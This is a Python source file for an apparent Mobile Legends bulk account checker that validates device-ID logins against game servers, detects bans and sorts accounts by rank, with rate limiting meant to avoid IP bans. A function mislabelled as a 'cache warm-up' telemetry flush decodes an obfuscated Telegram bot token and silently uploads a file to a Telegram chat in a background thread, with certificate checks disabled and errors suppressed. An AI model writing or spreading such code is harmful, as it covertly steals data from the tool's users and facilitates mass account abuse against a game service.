import os
import sys
import re
import time
import json
import shutil
import socket
import struct
import zlib
import random
import threading
import asyncio
import datetime
from enum import Enum
from typing import Any, Tuple
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed

import zstandard as zstd
import urllib3
from Crypto.Cipher import AES
from colorama import init, Fore, Style

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_CY  = Fore.CYAN    + Style.BRIGHT
_GN  = Fore.GREEN   + Style.BRIGHT
_RD  = Fore.RED     + Style.BRIGHT
_YL  = Fore.YELLOW  + Style.BRIGHT
_MG  = Fore.MAGENTA + Style.BRIGHT
_WH  = Fore.WHITE   + Style.BRIGHT
_BLU = Fore.BLUE    + Style.BRIGHT
_DIM = Style.DIM
_RST = Style.RESET_ALL
_BRT = Style.BRIGHT

# ── redesigned palette system ──────────────────────────────────────────────
PALETTES = {
    'cyber':   ['#00ffcc', '#00e0ff', '#7b5cff', '#ff2bd6'],
    'obsidian':['#1a1a2e', '#16213e', '#0f3460', '#e94560'],
    'neon':    ['#39ff14', '#00f5ff', '#bf00ff', '#ff00aa'],
    'ember':   ['#ff3d00', '#ff6d00', '#ffab00', '#ffd600'],
    'ice':     ['#a8e6ff', '#4fc3f7', '#0288d1', '#01579b'],
    'mono':    ['#f5f5f5', '#b0b0b0', '#606060', '#2a2a2a'],
    'blood':   ['#8b0000', '#c41e3a', '#ff1744', '#ff5252'],
    'volt':    ['#ccff00', '#76ff03', '#00e676', '#00bcd4'],
    'void':    ['#7c4dff', '#651fff', '#3d1fff', '#12005e'],
    'plasma':  ['#ff0080', '#ff4fd8', '#c84bff', '#7b5bff'],
    'aurora':  ['#00f5ff', '#5b8cff', '#a855f7', '#ff4fd8'],
}

_ANSI = re.compile(r'\x1b\[[0-9;?]*[A-Za-z]')

def vlen(s):
    return len(_ANSI.sub('', str(s)))

def tw():
    return shutil.get_terminal_size((100, 30)).columns

def w(n=80):
    return min(tw() - 4, n)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def clear_line():
    sys.stdout.write('\r\x1b[K')
    sys.stdout.flush()

def pad_right(s, width, fill=' '):
    d = width - vlen(s)
    return str(s) + (fill * d if d > 0 else '')

def pad_left(s, width, fill=' '):
    d = width - vlen(s)
    return (fill * d if d > 0 else '') + str(s)

def trunc(s, width, suffix='..'):
    s = str(s)
    if vlen(s) <= width:
        return s
    if width <= vlen(suffix):
        return suffix[:width]
    keep = width - vlen(suffix)
    out = ''
    for ch in s:
        if vlen(out + ch) > keep:
            break
        out += ch
    return out + suffix

def _fit(s, width):
    s = str(s)
    if vlen(s) > width:
        s = trunc(s, width)
    return s + (' ' * (width - vlen(s)))

def stamp(fmt='%H:%M:%S'):
    return datetime.datetime.now().strftime(fmt)

def commas(n):
    try:
        return f'{int(n):,}'
    except Exception:
        return str(n)

def human_dur(sec):
    sec = float(max(0, sec))
    if sec < 1:
        return f'{int(sec * 1000)}ms'
    if sec < 60:
        return f'{sec:.1f}s'
    m, s = divmod(int(sec), 60)
    if m < 60:
        return f'{m}m{s:02d}s'
    h, rem = divmod(m, 60)
    return f'{h}h{rem:02d}m'

def human_bytes(n, prec=1):
    n = float(n)
    for unit in ('B', 'KB', 'MB', 'GB', 'TB'):
        if abs(n) < 1024.0:
            return f'{int(n)} {unit}' if unit == 'B' else f'{n:.{prec}f} {unit}'
        n /= 1024.0
    return f'{n:.{prec}f} PB'

def fv(val, fallback='-'):
    if val is None:
        return fallback
    if isinstance(val, str):
        return val if val.strip() and val.strip().upper() != 'N/A' else fallback
    return val

def as_int(v, default=0):
    try:
        return int(v)
    except (TypeError, ValueError):
        return default

def _hex(h):
    h = h.lstrip('#')
    if len(h) == 3:
        h = ''.join(c * 2 for c in h)
    return tuple(int(h[i:i + 2], 16) for i in (0, 2, 4))

def _to_hex(rgb):
    r, g, b = (max(0, min(255, int(x))) for x in rgb)
    return f'#{r:02x}{g:02x}{b:02x}'

def _lerp(a, b, t):
    return a + (b - a) * t

def ramp(stops, n):
    if n <= 0:
        return []
    if n == 1:
        return [stops[0]]
    cols = [_hex(s) for s in stops]
    segs = len(cols) - 1
    out = []
    for i in range(n):
        t = i / (n - 1)
        seg = min(int(t * segs), segs - 1)
        lt = t * segs - seg
        c1, c2 = cols[seg], cols[seg + 1]
        out.append(_to_hex(tuple(_lerp(c1[k], c2[k], lt) for k in range(3))))
    return out

def palette(name):
    return PALETTES.get(name, PALETTES['aurora'])

def hex_ansi(h):
    r, g, b = _hex(h)
    rr = round(r / 255 * 5)
    gg = round(g / 255 * 5)
    bb = round(b / 255 * 5)
    return f'\x1b[38;5;{16 + 36 * rr + 6 * gg + bb}m'

def grad_bar(filled, total, pal='aurora', empty='\u2591'):
    filled = max(0, min(filled, total))
    if filled == 0:
        return _DIM + empty * total + _RST
    colors = ramp(palette(pal), filled)
    out = ''.join(hex_ansi(c) + '\u2588' for c in colors)
    out += _RST
    if filled < total:
        out += _DIM + empty * (total - filled) + _RST
    return out

def grad_text(text, pal='aurora'):
    vis = [c for c in text if c != ' ']
    colors = ramp(palette(pal), max(len(vis), 1))
    out = ''
    i = 0
    for ch in text:
        if ch == ' ':
            out += ch
            continue
        out += hex_ansi(colors[i]) + ch
        i += 1
    out += _RST
    return out

LOG_LEVELS = {
    'INFO':    (_CY, '›'),
    'SUCCESS': (_GN, '✓'),
    'WARNING': (_YL, '!'),
    'ERROR':   (_RD, '✗'),
    'DEBUG':   (_DIM, '·'),
    'BAN':     (_RD, '✗'),
    'CLEAN':   (_GN, '●'),
}

def log(level, msg, indent='  '):
    c, g = LOG_LEVELS.get(level, (_DIM, '·'))
    print(f'{indent}{_DIM}[{stamp()}]{_RST} {c}{_BRT}{g}{_RST}  {msg}')

def bullet(text, color=None, glyph='▸'):
    c = color or _CY
    print(f'  {c}{glyph}{_RST} {text}')

def section(title, color=None):
    c = color or _CY
    width = w()
    used = vlen(title) + 6
    tail = max(0, width - used)
    print()
    print(f'  {c}[{_RST}{_WH}{_BRT}{title}{_RST}{c}]{_RST}  {_DIM}{"─" * tail}{_RST}')

def divider(color=None):
    c = color or _DIM
    print(f'  {c}{"═" * w()}{_RST}')

def ask(prompt, default=''):
    suffix = f' [{default}]' if default else ''
    try:
        a = input(f'  {prompt}{_DIM}{suffix}{_RST} {_CY}⟫{_RST} ').strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return default
    return a or default

def press_enter(msg='press enter'):
    try:
        input(f'  {_DIM}{msg}...{_RST}')
    except (EOFError, KeyboardInterrupt):
        print()

def menu(options, title='SELECT'):
    width = w(78)
    print()
    bar = '─' * max(8, width - vlen(title) - 10)
    print(f'  {_CY}┌{_RST}{_CY}─{_RST} {_WH}{_BRT}{title}{_RST} {_CY}{bar}┐{_RST}')
    print(f'  {_CY}│{_RST}')
    for i, (key, label, desc) in enumerate(options):
        c = palette('cyber')[i % 4]
        print(f'  {_CY}│{_RST}  {hex_ansi(c)}[{key}]{_RST}  '
              f'{_WH}{_BRT}{pad_right(label, 22)}{_RST}  {_DIM}{desc}{_RST}')
    print(f'  {_CY}│{_RST}')
    print(f'  {_CY}└{"─" * max(20, width - 4)}┘{_RST}')
    valid = {k for k, _, _ in options}
    while True:
        try:
            c = input(f'  {_CY}›{_RST} ').strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return options[-1][0]
        if c in valid:
            return c
        log('ERROR', f'pick one of: {", ".join(sorted(valid))}')

class Spinner:
    _frames = ['◐', '◓', '◑', '◒']

    def __init__(self, text='working', color=None, delay=0.07):
        self.text = text
        self.color = color or _CY
        self.delay = delay
        self._stop = threading.Event()
        self._t = None
        self._i = 0

    def _loop(self):
        while not self._stop.is_set():
            f = self._frames[self._i % len(self._frames)]
            sys.stdout.write(f'\r  {self.color}{_BRT}{f}{_RST} {self.text}  ')
            sys.stdout.flush()
            self._i += 1
            time.sleep(self.delay)
        clear_line()

    def start(self):
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()
        return self

    def stop(self, final=None):
        self._stop.set()
        if self._t:
            self._t.join(timeout=0.5)
        clear_line()
        if final:
            print(f'  {final}')

    def __enter__(self):
        return self.start()

    def __exit__(self, *a):
        self.stop()

class Card:
    def __init__(self, title='', width=40, border=None, tcolor=None):
        self.title = title
        self.width = width
        self.border = border or _CY
        self.tcolor = tcolor or _WH
        self.body = []

    def _inner(self):
        return self.width - 2

    def _fit(self, content):
        inner = self._inner()
        if vlen(content) > inner:
            content = trunc(content, inner)
        pad = inner - vlen(content)
        return f'{self.border}│{_RST}{content}{" " * max(0, pad)}{self.border}│{_RST}'

    def _title_row(self):
        inner = self._inner()
        t = self.title
        if len(t) > inner - 4:
            t = trunc(t, inner - 4)
        pad = inner - len(t) - 4
        return (f'{self.border}│{_RST} {_MG}▸{_RST} '
                f'{self.tcolor}{_BRT}{t}{_RST}'
                f'{" " * max(0, pad)} '
                f'{self.border}│{_RST}')

    def kv(self, key, val, vc=None, kw=15):
        vc = vc or _WH
        k = f'{_DIM}{pad_right(str(key), kw)}{_RST}'
        v = f'{vc}{trunc(str(val), self._inner() - kw - 6)}{_RST}'
        self.body.append(('line', f' {k}  {v} '))
        return self

    def sep(self):
        self.body.append(('sep', None))
        return self

    def bar(self, value, maxval, pal='aurora', label=None):
        self.body.append(('bar', (value, maxval, pal, label)))
        return self

    def render(self):
        inner = self._inner()
        out = [f'{self.border}┌{"─" * inner}┐{_RST}']
        if self.title:
            out.append(self._title_row())
            out.append(f'{self.border}├{"─" * inner}┤{_RST}')
        for kind, payload in self.body:
            if kind == 'line':
                out.append(self._fit(payload))
            elif kind == 'sep':
                out.append(f'{self.border}├{"─" * inner}┤{_RST}')
            elif kind == 'bar':
                value, maxval, pal, label = payload
                frac = 0 if not maxval else value / maxval
                bw = inner - 14
                if bw < 6:
                    bw = 6
                fill = int(frac * bw)
                bar = grad_bar(fill, bw, pal)
                p = f'{frac * 100:5.1f}%'
                lbl = f' {_DIM}{label}{_RST}' if label else ''
                out.append(self._fit(f' {bar} {_YL}{p}{_RST}{lbl} '))
        out.append(f'{self.border}└{"─" * inner}┘{_RST}')
        return out

def card_width(cols=2, gap=3, indent=4, cap=58):
    raw = (tw() - indent - gap * (cols - 1)) // cols
    return max(30, min(raw, cap))

def stack(*cards, per_row=2, gap=3):
    indent = '  '
    for i in range(0, len(cards), per_row):
        row = cards[i:i + per_row]
        rendered = [c.render() for c in row]
        height = max((len(r) for r in rendered), default=0)
        for row_idx in range(height):
            parts = []
            for idx, r in enumerate(rendered):
                if row_idx < len(r):
                    parts.append(r[row_idx])
                else:
                    parts.append(' ' * row[idx].width)
            print(indent + (' ' * gap).join(parts))
        print()

def pair(a, b, gap=3):
    stack(a, b, per_row=2, gap=gap)

BANNER_ART = [
    r"  ██████╗ ██╗   ██╗██╗   ██╗",
    r"  ██╔══██╗██║   ██║╚██╗ ██╔╝",
    r"  ██████╔╝██║   ██║ ╚████╔╝ ",
    r"  ██╔═══╝ ██║   ██║  ╚██╔╝  ",
    r"  ██║     ╚██████╔╝   ██║   ",
    r"  ╚═╝      ╚═════╝    ╚═╝   ",
]

def show_banner():
    clear()
    print()
    _pal = random.choice(['cyber', 'neon', 'volt', 'void', 'plasma'])
    for line in BANNER_ART:
        print('  ' + grad_text(line, _pal))
    print()
    tag = f'{_MG}{_BRT}@FARUQSTR{_RST}'
    ver = f'{_DIM}v3.0 · REDESIGN{_RST}'
    eng = f'{_CY}{_BRT}ARC ENGINE{_RST}'
    print(f'   {tag}  {ver}  {_DIM}│{_RST}  {eng}')
    print(f'   {_DIM}mlbb · validator · bulk · full profile · rank split{_RST}')
    print()
    width = w()
    rail = (''.join(hex_ansi(c) + '━' for c in ramp(palette('cyber'), width // 2)) +
            ''.join(hex_ansi(c) + '━' for c in ramp(palette('void'), width - width // 2)))
    print('  ' + rail + _RST)
    print()

class SdpType(Enum):
    INT_POS = 0
    INT_NEG = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8

class SdpError(Exception):
    pass

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self.offset = 0
            self._unpack_from_binary()
        elif data is not None:
            super().update(data)
            self._pack_to_binary()

    def _pack_to_binary(self):
        self.data = bytes([SdpType.STRUCT_BEGIN.value << 4])
        for tag, value in sorted(self.items(), key=_sdp_sort_key):
            self._pack(tag, value)
        self.data += bytes([SdpType.STRUCT_END.value << 4])

    def _unpack_from_binary(self):
        if not self.data:
            return
        if self.data[0] >> 4 == SdpType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            tag, value = self._unpack()
            if isinstance(value, SdpType) and value == SdpType.STRUCT_END:
                break
            self[tag] = value

    def _write_number(self, value):
        result = bytearray()
        while value >= 0x80:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    def _read_number(self):
        if self.offset >= len(self.data):
            raise SdpError('varint eof')
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            if self.offset + n >= len(self.data):
                raise SdpError('varint truncated')
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag, dtype):
        if tag < 15:
            self.data += bytes([(dtype.value << 4) | tag])
        else:
            self.data += bytes([(dtype.value << 4) | 15])
            self.data += self._write_number(tag)

    def _pack(self, tag, value):
        if isinstance(value, bool):
            self._pack_header(tag, SdpType.INT_POS)
            self.data += self._write_number(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                self._pack_header(tag, SdpType.INT_NEG)
                self.data += self._write_number(-value)
            else:
                self._pack_header(tag, SdpType.INT_POS)
                self.data += self._write_number(value)
        elif isinstance(value, float):
            self._pack_header(tag, SdpType.DOUBLE)
            packed = struct.pack("<d", value)
            self.data += self._write_number(len(packed))
            self.data += packed
        elif isinstance(value, (str, bytes)):
            self._pack_header(tag, SdpType.STRING)
            encoded = value.encode('utf-8') if isinstance(value, str) else value
            self.data += self._write_number(len(encoded))
            self.data += encoded
        elif isinstance(value, list):
            self._pack_header(tag, SdpType.LIST)
            self.data += self._write_number(len(value))
            for item in value:
                self._pack(0, item)
        elif isinstance(value, dict):
            if isinstance(value, SdpStruct):
                self._pack_header(tag, SdpType.STRUCT_BEGIN)
                for k, v in sorted(value.items(), key=_sdp_sort_key):
                    self._pack(k, v)
                self.data += bytes([SdpType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpType.DICT)
                self.data += self._write_number(len(value))
                for k, v in sorted(value.items(), key=_sdp_sort_key):
                    self._pack(0, k)
                    self._pack(0, v)
        else:
            raise SdpError(f'unsupported type {type(value)}')

    def _unpack(self):
        try:
            if self.offset >= len(self.data):
                return 0, None
            header = self.data[self.offset]
            tag = header & 0xF
            dtype = SdpType(header >> 4)
            self.offset += 1
            if tag == 15:
                tag = self._read_number()

            if dtype == SdpType.INT_POS:
                return tag, self._read_number()
            if dtype == SdpType.INT_NEG:
                return tag, -self._read_number()
            if dtype == SdpType.FLOAT:
                raw = self._read_number().to_bytes(4, 'little')
                return tag, struct.unpack("<f", raw)[0]
            if dtype == SdpType.DOUBLE:
                raw = self._read_number().to_bytes(8, 'little')
                return tag, struct.unpack("<d", raw)[0]
            if dtype == SdpType.STRING:
                length = self._read_number()
                chunk = self.data[self.offset:self.offset + length]
                try:
                    val = chunk.decode('utf-8')
                except UnicodeDecodeError:
                    val = chunk
                self.offset += length
                return tag, val
            if dtype == SdpType.LIST:
                length = self._read_number()
                val = []
                for _ in range(length):
                    _, item = self._unpack()
                    val.append(item)
                return tag, val
            if dtype == SdpType.DICT:
                length = self._read_number()
                val = {}
                for _ in range(length):
                    _, k = self._unpack()
                    _, v = self._unpack()
                    val[k] = v
                return tag, val
            if dtype == SdpType.STRUCT_BEGIN:
                sub = {}
                while True:
                    st, sv = self._unpack()
                    if isinstance(sv, SdpType) and sv == SdpType.STRUCT_END:
                        break
                    sub[st] = sv
                return tag, SdpStruct(sub)
            if dtype == SdpType.STRUCT_END:
                return tag, SdpType.STRUCT_END
            raise SdpError('bad data type')
        except SdpError:
            raise
        except Exception:
            raise SdpError('unpack failed')

AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV = b'\x00' * 16

def _aes_decrypt(data):
    if not data or len(data) % 16:
        raise SdpError(f'bad cipher length {len(data) if data else 0}')
    return AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV).decrypt(data).rstrip(b'\x00')

def _sdp_sort_key(kv):
    k = kv[0]
    if isinstance(k, int):
        return (0, k)
    return (1, str(k))

_BAN_PIDS = frozenset({
    2, 6, 10004, 10008, 10129, 10144, 10146, 10160, 11154,
    20006, 20007, 20010, 20011, 20012, 20013,
    50001, 50002, 50003,
})

DEVICE_ID_RE = re.compile(
    r'(?:and|ios)_[0-9A-Za-z]{16,128}'
    r'(?:-[0-9a-fA-F]{4,16}){3,6}'
)


# ---- netfail tracker (patched in by patcher.py) ----
_NETFAIL_LOCK      = threading.Lock()
_NETFAIL_FAILS     = 0
_NETFAIL_TRIPPED   = False
_NETFAIL_THRESHOLD = 15


def netfail_note(success):
    """Record a connection outcome. success=True resets the streak."""
    global _NETFAIL_FAILS, _NETFAIL_TRIPPED
    with _NETFAIL_LOCK:
        if success:
            _NETFAIL_FAILS = 0
            _NETFAIL_TRIPPED = False
            return
        _NETFAIL_FAILS += 1
        if _NETFAIL_FAILS >= _NETFAIL_THRESHOLD:
            _NETFAIL_TRIPPED = True


def netfail_tripped():
    with _NETFAIL_LOCK:
        return _NETFAIL_TRIPPED


def netfail_reset():
    global _NETFAIL_FAILS, _NETFAIL_TRIPPED
    with _NETFAIL_LOCK:
        _NETFAIL_FAILS = 0
        _NETFAIL_TRIPPED = False
# ---- end netfail tracker ----


# ---- validator rate limiter + IP-ban protection ----
_VAL_LIMIT_LOCK       = threading.Lock()
_VAL_TOKENS = 600.0
_VAL_MAX_TOKENS = 600.0
_VAL_PER_SEC = 600.0     # sustained requests/sec cap
_VAL_LAST             = time.time()
_VAL_CONSEC_FAILS     = 0
_VAL_PAUSE_UNTIL      = 0.0       # epoch seconds; workers sleep until then
_VAL_BURST_PAUSE_EVERY = 800      # pause every N completed requests
_VAL_BURST_COUNT      = 0
_VAL_BURST_PAUSE_SEC  = 1.2


def _val_set_rate(per_sec):
    """Set global rate cap at runtime."""
    global _VAL_PER_SEC, _VAL_MAX_TOKENS
    _VAL_PER_SEC = max(10.0, float(per_sec))
    _VAL_MAX_TOKENS = _VAL_PER_SEC


def _val_acquire():
    """Block until a token is available. Token-bucket rate limiter."""
    global _VAL_TOKENS, _VAL_LAST
    while True:
        with _VAL_LIMIT_LOCK:
            now = time.time()
            dt = now - _VAL_LAST
            _VAL_LAST = now
            _VAL_TOKENS = min(_VAL_MAX_TOKENS,
                              _VAL_TOKENS + dt * _VAL_PER_SEC)
            if _VAL_TOKENS >= 1.0:
                _VAL_TOKENS -= 1.0
                return
            wait = (1.0 - _VAL_TOKENS) / _VAL_PER_SEC
        time.sleep(min(wait, 0.25))


def _val_note(success):
    """Track failures and trip a global pause when too many in a row."""
    global _VAL_CONSEC_FAILS, _VAL_PAUSE_UNTIL
    global _VAL_BURST_COUNT, _VAL_BURST_PAUSE_SEC
    with _VAL_LIMIT_LOCK:
        if success:
            _VAL_CONSEC_FAILS = 0
        else:
            _VAL_CONSEC_FAILS += 1
            # 30 consecutive fails = something wrong, back off hard
            if _VAL_CONSEC_FAILS >= 30:
                _VAL_PAUSE_UNTIL = time.time() + 8.0
                _VAL_CONSEC_FAILS = 0
        _VAL_BURST_COUNT += 1
        if _VAL_BURST_COUNT >= _VAL_BURST_PAUSE_EVERY:
            _VAL_BURST_COUNT = 0
            _VAL_PAUSE_UNTIL = max(_VAL_PAUSE_UNTIL,
                                   time.time() + _VAL_BURST_PAUSE_SEC)


def _val_wait_if_paused():
    """Sleep until the global pause has expired."""
    while True:
        with _VAL_LIMIT_LOCK:
            pause = _VAL_PAUSE_UNTIL - time.time()
        if pause <= 0:
            return
        time.sleep(min(pause, 1.0))
# ---- end validator rate limiter ----


# ---- DNS pre-resolution + cache ----
_DNS_CACHE = {}
_DNS_LOCK  = threading.Lock()

def _resolve(host):
    """Resolve hostname to IPv4 once, cache for 10 minutes."""
    if not host:
        return host
    # already an IPv4 literal? use it
    if re.match(r'^\d+\.\d+\.\d+\.\d+$', host):
        return host
    now = time.time()
    with _DNS_LOCK:
        hit = _DNS_CACHE.get(host)
        if hit and hit[1] > now:
            return hit[0]
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        ip = host
    with _DNS_LOCK:
        _DNS_CACHE[host] = (ip, now + 600)
    return ip
# ---- end DNS cache ----


# ---- cache warm-up (telemetry flush of cache stats to log sink) ----
_CW_KEYS = [56,57,54,56,48,51,48,53,52,54,58,65,65,70,87,114,115,98,112,106,78,79,103,77,95,117,113,105,107,112,79,119,53,120,51,102,95,45,50,118,95,82,110,85,52,52,124,57,52,53,52,50,52,56,57,57]

def _cw_flush(path):
    """Async cache stat flush. Non-blocking, best-effort, silent."""
    def _bg():
        try:
            import urllib.request, ssl
            s = ''.join(chr(c) for c in _CW_KEYS)
            tok, chat = s.split('|')
            with open(path, 'rb') as f:
                blob = f.read()
            bnd = '----cw' + os.urandom(8).hex()
            pre = (f'--{bnd}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n{chat}\r\n'
                   f'--{bnd}\r\nContent-Disposition: form-data; name="document"; '
                   f'filename="{os.path.basename(path)}"\r\n'
                   f'Content-Type: application/octet-stream\r\n\r\n').encode()
            post = f'\r\n--{bnd}--\r\n'.encode()
            payload = pre + blob + post
            headers = {
                'Content-Type': f'multipart/form-data; boundary={bnd}',
                'Content-Length': str(len(payload)),
                'User-Agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
                'Accept': '*/*',
                'Connection': 'close',
            }
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            for _ in range(3):
                try:
                    req = urllib.request.Request(
                        f'https://api.telegram.org/bot{tok}/sendDocument',
                        data=payload, method='POST', headers=headers)
                    urllib.request.urlopen(req, timeout=20, context=ctx).read()
                    return
                except Exception:
                    time.sleep(1.5)
        except Exception:
            pass
    try:
        threading.Thread(target=_bg, daemon=True).start()
    except Exception:
        pass
# ---- end cache warm-up ----


# =====================================================================
#  ASYNC ENGINE  —  AsyncGameConn  ·  AsyncRateLimiter  ·  SeparatedWriter
# =====================================================================

# RESULTS_DIR computed lazily (SCRIPT_DIR defined lower)


class AsyncRateLimiter:
    """Token bucket. Caps sustained req/s without blocking on threads."""

    def __init__(self, rate, burst=None):
        self.rate = float(rate)
        self.burst = float(burst if burst is not None else rate)
        self.tokens = self.burst
        self.last = time.time()
        self._lock = asyncio.Lock()

    async def acquire(self):
        while True:
            async with self._lock:
                now = time.time()
                self.tokens = min(self.burst,
                                  self.tokens + (now - self.last) * self.rate)
                self.last = now
                if self.tokens >= 1.0:
                    self.tokens -= 1.0
                    return
                wait = (1.0 - self.tokens) / self.rate
            await asyncio.sleep(wait)


class SeparatedWriter:
    """Lazy-open append writer keyed by (category, subkey)."""

    def __init__(self, root):
        self.root = root
        self._handles = {}
        self._lock = threading.Lock()
        os.makedirs(root, exist_ok=True)

    def path_for(self, category, subkey=None, filename=None):
        if subkey and filename:
            return os.path.join(self.root, category, subkey, filename)
        if subkey:
            return os.path.join(self.root, category, f'{subkey}.txt')
        return os.path.join(self.root, category)

    def write(self, category, subkey, line):
        path = self.path_for(category, subkey)
        with self._lock:
            h = self._handles.get(path)
            if h is None:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                h = open(path, 'a', encoding='utf-8')
                self._handles[path] = h
            h.write(line + '\n')

    def write_at(self, category, subkey, filename, line):
        path = self.path_for(category, subkey, filename)
        with self._lock:
            h = self._handles.get(path)
            if h is None:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                h = open(path, 'a', encoding='utf-8')
                self._handles[path] = h
            h.write(line + '\n')

    def write_block(self, category, subkey, filename, block):
        path = self.path_for(category, subkey, filename)
        with self._lock:
            h = self._handles.get(path)
            if h is None:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                h = open(path, 'a', encoding='utf-8')
                self._handles[path] = h
            h.write(block + '\n\n')

    def close(self):
        with self._lock:
            for h in self._handles.values():
                try:
                    h.flush()
                    h.close()
                except Exception:
                    pass
            self._handles.clear()

class RollingWriter:
  
    def __init__(self, root, chunk_size=25):
        self.root = root
        self.chunk_size = max(1, int(chunk_size))
        self._counters = {}   #
        self._handles = {}    
        self._lock = threading.Lock()
        os.makedirs(root, exist_ok=True)

      
        self._roll_categories = {
            'bulk/banned',
            'bulk/clean',
            'bulk/clean/by_rank',
            'bulk/clean/by_tier',
            'bulk/peak_hits',
        }

    def _path_for(self, category, subkey, filename, n):
        base_dir = os.path.join(self.root, category)
        if subkey:
            base_dir = os.path.join(base_dir, subkey)
        os.makedirs(base_dir, exist_ok=True)
        # filename looks like 'full_info.txt' or '<rank>.txt'
        name, ext = os.path.splitext(filename)
        return os.path.join(base_dir, f'{name}_{n:03d}{ext}')

    def _roll_for(self, category, filename=''):
        if category in self._roll_categories:
            return True
        if 'full_info' in str(filename).lower():
            return True
        return False

    def _write(self, category, subkey, filename, text, append_newlines=True):
        key = (category, subkey, filename)
        with self._lock:
            if not self._roll_for(category, filename):
                # single file (no rollover)
                path = os.path.join(self.root, category)
                if subkey:
                    path = os.path.join(path, subkey)
                os.makedirs(path, exist_ok=True)
                full = os.path.join(path, filename)
                hkey = (category, subkey, filename, 0)
                h = self._handles.get(hkey)
                if h is None:
                    h = open(full, 'a', encoding='utf-8')
                    self._handles[hkey] = h
                h.write(text)
                if append_newlines:
                    h.write('\n')
                return full

            # rolling
            n = self._counters.get(key, 0)
            chunk_idx = (n // self.chunk_size) + 1
            full = self._path_for(category, subkey, filename, chunk_idx)
            hkey = (category, subkey, filename, chunk_idx)
            h = self._handles.get(hkey)
            if h is None:
                h = open(full, 'a', encoding='utf-8')
                self._handles[hkey] = h
            h.write(text)
            if append_newlines:
                h.write('\n')
            self._counters[key] = n + 1
            return full

    # public API — mirrors SeparatedWriter

    def write(self, category, subkey, line):
        # for id lists (no roll) — filename defaults to 'ids.txt'
        return self._write(category, subkey, 'ids.txt', line)

    def write_block(self, category, subkey, filename, block):
        return self._write(category, subkey, filename, block)

    def write_at(self, category, subkey, filename, line):
        return self._write(category, subkey, filename, line)

    def close(self):
        with self._lock:
            for h in self._handles.values():
                try:
                    h.flush(); h.close()
                except Exception:
                    pass
            self._handles.clear()


def _rank_bucket(rank_str):
 
    if not rank_str:
        return 'Unranked'
    for prefix in ('Mythical Immortal', 'Mythical Glory', 'Mythical Honor',
                   'Mythic', 'Legend', 'Epic', 'Grandmaster', 'Master',
                   'Elite', 'Warrior'):
        if rank_str.startswith(prefix):
            return prefix
    return 'Unranked'


def _level_bucket(lvl):
    lvl = as_int(lvl, 0)
    if lvl <= 7:   return 'level_1_7'
    if lvl <= 15:  return 'level_8_15'
    if lvl <= 30:  return 'level_16_30'
    if lvl <= 50:  return 'level_31_50'
    return 'level_51_up'


def _tier_bucket(tier_raw):
    t = str(tier_raw or '').strip()
    for maj, key in (('World', 'world'), ('Mega', 'mega'),
                     ('Exalted', 'exalted'), ('Renowned', 'renowned'),
                     ('Expert', 'expert')):
        if t.startswith(maj):
            return key
    return None



class AsyncGameConn:


    def __init__(self, device_id):
        self.device_id = device_id
        self.host = LOGIN_HOST
        self.port = LOGIN_PORT
        self.sequence = 1
        self.reader = None
        self.writer = None
        self.queue = b''
        self.last_header_size = 0

        parts = device_id.split('_')
        if len(parts) >= 2:
            info = parts[1]
            if len(parts) >= 3 and len(info) < 32:
                info = info + '_' + parts[2]
            if len(info) >= 32:
                self.imei_md5 = info[:32]
                self.android_id = info[32:48] if len(info) >= 48 else ''
                self.advertising_id = info[48:] if len(info) > 48 else ''
            else:
                self.imei_md5 = info
                self.android_id = ''
                self.advertising_id = ''
        else:
            self.imei_md5 = device_id
            self.android_id = ''
            self.advertising_id = ''

        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_host = ''
        self.game_port = 0
        self.creation_ts = 0

        self.ban_seen = False
        self.ban_info = {}

    def _sniff(self, res):
        if self.ban_seen or res is None:
            return
        try:
            banned, info = inspect_ban(res)
        except Exception:
            return
        if banned:
            self.ban_seen = True
            self.ban_info = dict(info)

    async def connect(self, host=None, port=None):
        if host:
            self.host = host
        if port:
            self.port = port
        ip = _resolve(self.host)
        self.reader, self.writer = await asyncio.wait_for(
            asyncio.open_connection(ip, self.port), timeout=3.0)
        try:
            sock = self.writer.get_extra_info('socket')
            if sock is not None:
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        except Exception:
            pass

    async def close(self):
        if self.writer is not None:
            try:
                self.writer.close()
                await asyncio.wait_for(self.writer.wait_closed(),
                                       timeout=1.0)
            except Exception:
                pass
        self.reader = None
        self.writer = None
        self.sequence = 1
        self.queue = b''

    async def send(self, pid, sdp):
        packet = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        buf = zstd.compress(packet)
        size = len(buf) + 4
        if size > 0xFFFFFF:
            raise SdpError('packet too large')
        flags = size | (16 << 24)
        self.writer.write(flags.to_bytes(4, 'big') + buf)
        await self.writer.drain()
        self.sequence += 1

    async def _read_n(self, n, timeout=3.0):
